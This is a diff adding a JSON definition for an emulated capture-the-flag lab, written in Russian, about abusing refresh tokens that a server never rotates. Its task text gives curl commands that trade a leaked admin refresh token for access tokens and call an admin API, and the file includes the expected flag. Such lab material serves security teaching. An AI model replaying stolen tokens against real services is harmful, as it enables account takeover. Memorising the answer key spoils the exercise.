@@ -1,0 +1,34 @@
+{
+  "id": "web-refresh-token",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{r3fr3sh_t0k3n_n0_r0t4t10n}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: атака на refresh-токен\n\nЦель — `https://shop.local` (OAuth-подобный вход). Сервер **не ротирует**\nrefresh-токен: один и тот же `refresh_token` можно предъявлять сколько угодно\nраз, и каждый раз он выдаёт новый access-токен.\n\nУ нас утёк refresh-токен администратора:\n`rt_9f2c8a1b4e6d7f0a2c3e5b8d1a4f7c9e`.\n\n1. Обменяй его на access-токен:\n   `curl -s 'https://shop.local/oauth/token' -d 'grant_type=refresh_token&refresh_token=rt_9f2c8a1b4e6d7f0a2c3e5b8d1a4f7c9e'`\n2. Заметь: в ответе тот же `refresh_token` (ротации нет).\n3. Используй выданный access-токен против админского API:\n   `curl -s 'https://shop.local/api/admin' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.sig' | grep 'nto{' > found.txt`\n4. Набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        {
+          "match": "grant_type=refresh_token",
+          "example": "-s 'https://shop.local/oauth/token' -d 'grant_type=refresh_token&refresh_token=rt_9f2c...'",
+          "output": "{\"access_token\":\"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.sig\",\"token_type\":\"Bearer\",\"expires_in\":600,\"refresh_token\":\"rt_9f2c8a1b4e6d7f0a2c3e5b8d1a4f7c9e\",\"refresh_expires_in\":2592000}\n"
+        },
+        {
+          "match": "api/admin",
+          "example": "-s 'https://shop.local/api/admin' -H 'Authorization: Bearer eyJ...'",
+          "output": "{\"role\":\"admin\",\"user\":\"admin\",\"flag\":\"nto{r3fr3sh_t0k3n_n0_r0t4t10n}\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются только /oauth/token и /api/admin на shop.local.\n"
+    }
+  }
+}
